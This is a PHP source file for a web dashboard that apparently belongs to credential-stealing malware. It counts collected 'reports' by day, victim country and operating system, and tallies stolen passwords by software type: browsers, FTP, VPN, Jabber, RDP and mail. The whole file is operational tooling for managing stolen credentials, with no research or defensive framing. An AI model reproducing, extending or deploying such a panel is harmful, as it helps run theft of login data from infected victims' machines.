<?php
require_once('common.php');
require_once('global.php');
?>

<!DOCTYPE html>

<html>
	<head>
		<link rel="shortcut icon" type="image/png" href="img/favicon.png">
	</head>

	<body>
		<?php $type = "index"; require_once("nav_bar.php"); ?>

        <div class="main-info">
            <div style="display: inline-block; vertical-align: top; *zoom: 1; *display: inline;">
                <p class="content-subheading">Reports count</p>
                <ul class="countries-list">
                    <?php
                        $timestamp = time();
                        $today_timestamp = $timestamp - ($timestamp % 86400);
                        $today_count = mysqlQuery("SELECT COUNT(*) AS count FROM `reports` WHERE timestamp >= ".$today_timestamp)[0]['count'];
                        $total_count = mysqlQuery('SELECT COUNT(*) AS count FROM `reports`')[0]['count'];
                        echo "<li><p class='stats-heading'>Total — <span class='list-number'>$total_count</span></p></li>";
                        echo "<li><p class='stats-heading'>Today — <span class='list-number'>$today_count</span></p></li>";
                    ?>
                </ul>
            </div>
            <div style="display: inline-block; vertical-align: top; padding-left: 10px; *zoom: 1; *display: inline;">
                <p class="content-subheading">Country stats</p>
                <ul class="countries-list">
                    <?php
                    $countries_res = mysqlQuery('SELECT DISTINCT COUNT(country) as count, country FROM `reports` GROUP BY country');
                    $countries = array();
                    for ($i = 0; $i < count($countries_res); ++$i) $countries[$countries_res[$i]['country']] = $countries_res[$i]['count'];
                    arsort($countries);
                    foreach($countries as $key => $value)
                    {
                        echo "<li><p class='stats-heading'>$key — <span class='list-number'>$value</span></p></li>";
                    }
                    ?>
                </ul>
            </div>
            <div style="display: inline-block; vertical-align: top; padding-left: 10px; *zoom: 1; *display: inline;">
                <p class="content-subheading">Password count</p>
                <ul class="countries-list">
                    <?php
                    $passwords = mysqlQuery('SELECT DISTINCT COUNT(soft_type) as count, soft_type FROM `passwords` GROUP BY soft_type');
                    for ($i = 0; $i < count($passwords); ++$i)
                    {
                        $soft_type = '';
                        switch ($passwords[$i]['soft_type'])
                        {
                            case 0: $soft_type = 'Browsers'; break;
                            case 1: $soft_type = 'FTP'; break;
                            case 2: $soft_type = 'VPN'; break;
                            case 3: $soft_type = 'Jabber'; break;
                            case 4: $soft_type = 'RDP'; break;
							case 5: $soft_type = 'Mail'; break;
                        }
                        echo "<li><p class='stats-heading'>{$soft_type} - <span class='list-number'>{$passwords[$i]['count']}</span></p></li>";
                    }
                    ?>
                </ul>
            </div>
            <div style="display: inline-block; vertical-align: top; padding-left: 10px; *zoom: 1; *display: inline;">
                <p class="content-subheading">Operating System</p>
                <ul class="countries-list">
                    <?php
                    $os = mysqlQuery('SELECT DISTINCT COUNT(os_name) as count, os_name FROM `reports` GROUP BY os_name');
                    for ($i = 0; $i < count($os); ++$i)
                    {
                        echo "<li><p class='stats-heading'>{$os[$i]['os_name']} - <span class='list-number'>{$os[$i]['count']}</span></p></li>";
                    }
                    ?>
                </ul>
            </div>
        </div>
	</body>
</html>